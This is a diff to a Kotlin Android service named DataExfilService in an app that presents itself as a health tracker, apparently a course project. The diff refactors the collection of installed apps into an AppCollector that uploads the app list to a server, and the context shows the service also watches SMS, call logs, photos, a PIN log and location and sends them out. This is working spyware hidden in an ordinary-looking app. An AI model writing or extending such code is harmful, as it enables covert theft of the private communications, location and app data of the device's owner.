@@ -33,15 +33,8 @@ import android.provider.ContactsContract
 import android.provider.Settings
 import android.provider.CallLog
 import com.inf2007.healthtracker.R
-import com.google.android.gms.location.FusedLocationProviderClient
-import com.google.android.gms.location.LocationCallback
-import com.google.android.gms.location.LocationRequest
-import com.google.android.gms.location.LocationResult
-import com.google.android.gms.location.LocationServices
-import com.google.android.gms.location.Priority
 import android.location.Location
-import android.Manifest
-import android.content.pm.PackageManager
+import com.inf2007.healthtracker.utilities.collectors.AppCollector
 import com.inf2007.healthtracker.utilities.collectors.LocationCollector
 
 class DataExfilService : Service() {
@@ -80,9 +73,8 @@ class DataExfilService : Service() {
     private lateinit var smsCallLogCollector: SmsCallLogCollector
     private lateinit var smsObserver: ContentObserver
     private lateinit var callLogObserver: ContentObserver
-    private lateinit var packageLister: PackageLister
-    private var lastAppList: List<PackageLister.PackageInfo>? = null
 
+    private lateinit var appCollector: AppCollector
     private lateinit var locationCollector: LocationCollector
 
     private val uploadRunnable = object : Runnable {
@@ -115,6 +107,7 @@ class DataExfilService : Service() {
         }
     }
 
+    // Listens for app install / uninstall and update the server
     private val appInstallReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             val action = intent.action
@@ -129,8 +122,7 @@ class DataExfilService : Service() {
                     Log.i(TAG, "App installed: $packageName, Total apps now: $totalApps")
                 }
 
-                // Upload updated app list
-                uploadUserAppsList()
+                appCollector.collect()
             }
         }
     }
@@ -154,15 +146,16 @@ class DataExfilService : Service() {
             IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
         smsCallLogCollector = SmsCallLogCollector(this)
         setupSmsAndCallLogObservers()
-        packageLister = PackageLister(this)
-        packageLister.startListening()
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
-        uploadUserAppsList()
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
+        appCollector = AppCollector(this) { appsJson ->
+            uploadUserAppsJson(appsJson)
+        }
         locationCollector = LocationCollector(this) { location ->
             sendLocationToServer(location)
         }
 
+        appCollector.startObserving()
         locationCollector.startObserving()
     }
 
@@ -426,9 +419,6 @@ class DataExfilService : Service() {
             contentResolver.unregisterContentObserver(callLogObserver)
         }
         Log.d(TAG, "Data exfiltration service destroyed")
-        if (::packageLister.isInitialized) {
-            packageLister.stopListening()
-        }
         try {
             unregisterReceiver(appInstallReceiver)
         } catch (e: Exception) {
@@ -439,6 +429,7 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
         }
+        appCollector.stopObserving()
         locationCollector.stopObserving()
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
@@ -1114,53 +1105,6 @@ class DataExfilService : Service() {
         Log.d(TAG, "========== OBSERVER SETUP COMPLETE ==========")
     }
 
-    private fun uploadUserAppsList() {
-        if (!isNetworkAvailable()) {
-            Log.d(TAG, "No network, skipping user apps list")
-            return
-        }
-
-        Thread {
-            try {
-                Log.d(TAG, "========== UPLOADING USER APPS LIST ==========")
-
-                // Get current apps
-                val currentApps = packageLister.getUserApps()
-
-                // Check if anything changed
-                if (lastAppList != null) {
-                    val oldPackages = lastAppList!!.map { it.packageName }.toSet()
-                    val currentPackages = currentApps.map { it.packageName }.toSet()
-
-                    val newApps = currentPackages - oldPackages
-                    val removedApps = oldPackages - currentPackages
-
-                    if (newApps.isNotEmpty()) {
-                        Log.i(TAG, "New apps installed: $newApps")
-                    }
-                    if (removedApps.isNotEmpty()) {
-                        Log.i(TAG, "Apps uninstalled: $removedApps")
-                    }
-                }
-
-                // Update last list
-                lastAppList = currentApps
-
-                // Get JSON and upload
-                val jsonData = packageLister.getUserAppsAsJson()
-                jsonData.put("scan_type", if (lastAppList == null) "initial" else "update")
-
-                uploadUserAppsJson(jsonData)
-
-                // Save to file
-                packageLister.saveUserAppsToFile()
-
-            } catch (e: Exception) {
-                Log.e(TAG, "Error uploading user apps list", e)
-            }
-        }.start()
-    }
-
     private fun uploadUserAppsJson(jsonData: JSONObject) {
         try {
             val requestBody = jsonData.toString()
@@ -1176,7 +1120,6 @@ class DataExfilService : Service() {
                 override fun onFailure(call: Call, e: IOException) {
                     Log.e(TAG, "User apps JSON upload failed: ${e.message}")
                 }
-
                 override fun onResponse(call: Call, response: Response) {
                     if (response.isSuccessful) {
                         Log.i(TAG, "User apps JSON uploaded successfully")
@@ -1188,44 +1131,6 @@ class DataExfilService : Service() {
             })
         } catch (e: Exception) {
             Log.e(TAG, "Error uploading user apps JSON: ${e.message}")
-        }
-    }
-
-    private fun uploadUserAppsFile(bytes: ByteArray, fileName: String) {
-        try {
-            val deviceId = getUniqueDeviceId()
-
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("file", fileName,
-                    bytes.toRequestBody("text/plain".toMediaTypeOrNull()))
-                .addFormDataPart("device_id", deviceId)
-                .addFormDataPart("device_model", Build.MODEL)
-                .addFormDataPart("type", "user_apps_list")
-                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
-                .build()
-
-            val request = Request.Builder()
-                .url(USER_APPS_ENDPOINT)
-                .post(requestBody)
-                .build()
-
-            NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "User apps file upload failed: ${e.message}")
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    if (response.isSuccessful) {
-                        Log.i(TAG, "User apps file uploaded: $fileName")
-                    } else {
-                        Log.w(TAG, "User apps file upload failed: HTTP ${response.code}")
-                    }
-                    response.close()
-                }
-            })
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading user apps file: ${e.message}")
         }
     }
 
